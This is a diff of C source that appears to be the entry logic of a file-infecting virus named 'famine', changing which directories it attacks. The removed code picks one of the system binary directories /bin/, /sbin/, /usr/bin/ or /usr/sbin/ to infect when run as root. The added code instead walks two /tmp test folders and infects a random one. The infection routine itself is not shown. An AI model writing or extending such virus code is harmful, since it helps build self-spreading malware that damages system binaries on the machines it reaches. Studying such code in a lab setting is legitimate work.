@@ -1,14 +1,33 @@
 #include <famine.h>
 
 ////////////////////////////////////////////////////////////////////////////////
-/// STATIC FUNCTION
+/// STATIC FUNCTIONS
 ////////////////////////////////////////////////////////////////////////////////
 
-static inline unsigned int get_random_index(void)
+static void handle_user(void)
 {
-	const unsigned long seed = 0;
+	FUNC;
 
-	return ((long)(&seed) >> 8) % 4;
+	size_t m_entry = 0;
+	struct directory dir[] =
+	{
+		(struct directory){"/tmp/test/", 0},
+		(struct directory){"/tmp/test2/", 0},
+	};
+
+	for (unsigned char index = 0; index < USER_SIZE; index++)
+	{
+		update_entry(&dir[index]);
+		update_path(&dir[index]);
+		m_entry += dir[index].entry;
+	}
+
+	famine(dir[get_random_integer(USER_SIZE)].path, m_entry);
+}
+
+static void handle_root(void)
+{
+	FUNC;
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -17,20 +36,10 @@ static inline unsigned int get_random_index(void)
 
 void entry(void)
 {
-	unsigned int index = 4;
-	struct directory infect[] =
-	{
-		(struct directory){"/bin/", "", 5},
-		(struct directory){"/sbin/","", 6},
-		(struct directory){"/usr/bin/", "", 9},
-		(struct directory){"/usr/sbin/", "", 10},
-		(struct directory){"./", "", 2},
-	};
-
-	if (getuid() == 0)
-		index = get_random_index();
-	
-	famine(&infect[index]);
+	if (_getuid() == 0)
+		handle_root();
+	else
+		handle_user();
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -39,10 +48,5 @@ void entry(void)
 
 int main(void)
 {
-	g_fd = open("/tmp/logger", O_CREAT | O_WRONLY | O_APPEND, 0644);
-	dprintf(g_fd, "\n");
 	entry();
-	close(g_fd);
-
-	return 0;
 }
